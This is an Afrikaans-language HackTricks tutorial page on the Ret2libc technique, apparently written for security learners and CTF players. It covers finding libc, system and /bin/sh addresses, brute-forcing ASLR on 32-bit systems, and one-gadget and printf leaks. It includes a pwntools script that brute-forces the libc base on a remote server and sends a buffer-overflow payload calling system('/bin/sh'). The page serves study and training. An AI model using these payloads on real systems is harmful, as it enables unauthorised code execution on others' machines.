# Ret2lib

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Basiese Inligting**

Die essensie van **Ret2Libc** is om die uitvoeringsvloei van 'n kwesbare program te herlei na 'n funksie binne 'n gedeelde biblioteek (bv., **system**, **execve**, **strcpy**) in plaas daarvan om aanvaller-geleverde shellcode op die stapel uit te voer. Die aanvaller stel 'n payload saam wat die terugkeeradres op die stapel aanpas om na die gewenste biblioteekfunksie te wys, terwyl hy ook sorg dat enige nodige argumente korrek opgestel word volgens die aanroepkonvensie.

### **Voorbeeld Stappe (vereenvoudig)**

* Kry die adres van die funksie om aan te roep (bv. system) en die opdrag om aan te roep (bv. /bin/sh)
* Genereer 'n ROP-ketting om die eerste argument wat na die opdragstring wys en die uitvoeringsvloei na die funksie oor te dra

## Vind die adresse

* Aannemend dat die `libc` wat gebruik word die een van die huidige masjien is, kan jy vind waar dit in geheue gelaai sal word met: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

As jy wil kyk of die ASLR die adres van libc verander, kan jy doen:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Deur die libc wat gebruik word te ken, is dit ook moontlik om die offset na die `system` funksie te vind met:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Deur die libc wat gebruik word te ken, is dit ook moontlik om die offset na die string `/bin/sh` funksie te vind met:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Gebruik gdb-peda / GEF

As jy die libc ken wat gebruik word, is dit ook moontlik om Peda of GEF te gebruik om die adres van die **system** funksie, die **exit** funksie en die string **`/bin/sh`** te kry:
```bash
p system
p exit
find "/bin/sh"
```
### Gebruik van /proc/\<PID>/maps

As die proses **kinders** skep elke keer as jy met dit praat (netwerkbediener), probeer om daardie l√™er te **lees** (waarskynlik sal jy root nodig h√™).

Hier kan jy **presies vind waar die libc gelaai is** binne die proses en **waar dit gelaai gaan word** vir elke kind van die proses.

![](<../../../.gitbook/assets/image (853).png>)

In hierdie geval is dit gelaai in **0xb75dc000** (Dit sal die basisadres van libc wees)

## Onbekende libc

Dit mag moontlik wees dat jy **nie weet watter libc die bin√™re laai nie** (omdat dit dalk op 'n bediener gele√´ is waar jy geen toegang het nie). In daardie geval kan jy die kwesbaarheid misbruik om **adres te lek en uit te vind watter libc** biblioteek gebruik word:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

En jy kan 'n pwntools-sjabloon hiervoor vind in:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Ken libc met 2 offsets

Kyk na die bladsy [https://libc.blukat.me/](https://libc.blukat.me/) en gebruik 'n **paar adresse** van funksies binne die libc om die **weergawe wat gebruik word** uit te vind.

## Om ASLR in 32-bits te omseil

Hierdie brute-forcing aanvalle is **slegs nuttig vir 32-bis stelsels**.

* As die eksploit plaaslik is, kan jy probeer om die basisadres van libc te brute-force (nuttig vir 32-bis stelsels):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* As jy 'n afstandsbediener aanval, kan jy probeer om die **adres van die `libc` funksie `usleep` te brute-force**, met 10 as argument (byvoorbeeld). As die **bediener op 'n stadium 10s ekstra neem om te antwoord**, het jy die adres van hierdie funksie gevind.

## One Gadget

Voer 'n shell uit deur net na **een** spesifieke **adres** in libc te spring:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Code Voorbeeld

In hierdie voorbeeld is ASLR brute-force ge√Øntegreer in die kode en die kwesbare bin√™re is gele√´ op 'n afstandsbediener:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kode Voorbeeld

Kyk na die voorbeeld van:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Voorbeeld

In die geval van ARM64, spring die ret instruksie na waar die x30 register wys en nie waar die stapel register wys nie. Dit is dus 'n bietjie meer ingewikkeld.

Ook in ARM64 doen 'n instruksie wat die instruksie doen (dit is nie moontlik om in die middel van instruksies te spring en hulle in nuwe te transformeer nie).

Kyk na die voorbeeld van:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (of puts)

Dit stel jou in staat om **inligting van die proses te lek** deur `printf`/`puts` met spesifieke data as 'n argument aan te roep. Byvoorbeeld, om die adres van `puts` in die GOT in 'n uitvoering van `puts` te plaas, sal dit **die adres van `puts` in geheue lek**.

## Ret2printf

Dit beteken basies om 'n **Ret2lib te misbruik om dit in 'n `printf` formaat string kwesbaarheid te transformeer** deur die `ret2lib` te gebruik om printf met die waardes aan te roep om dit te ontgin (dit klink nutteloos maar is moontlik):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Ander Voorbeelde & verwysings

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, gegee 'n lek na die adres van 'n funksie in libc, met behulp van een gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR geaktiveer maar geen PIE nie, die eerste stap is om 'n oorgang te vul tot die byte 0x00 van die canary om dan puts aan te roep en dit te lek. Met die canary word 'n ROP gadget geskep om puts aan te roep om die adres van puts van die GOT te lek en dan 'n ROP gadget om `system('/bin/sh')` aan te roep.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ASLR geaktiveer, geen canary nie, stapeloorgang in hoof vanaf 'n kind funksie. ROP gadget om puts aan te roep om die adres van puts van die GOT te lek en dan 'n een gadget aan te roep.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bits, geen pie, geen canary, geen relro, nx. Gebruik die write funksie om die adres van write (libc) te lek en roep een gadget aan.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Gebruik 'n formaat string om die canary van die stapel te lek en 'n buffer oorgang om in system te bel (dit is in die GOT) met die adres van `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, geen relro, geen canary, nx, pie. Misbruik 'n slegte indeksering om adresse van libc en heap van die stapel te lek. Misbruik die buffer oorgang om 'n ret2lib aan te roep wat `system('/bin/sh')` aanroep (die heap adres is nodig om 'n kontrole te omseil).

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
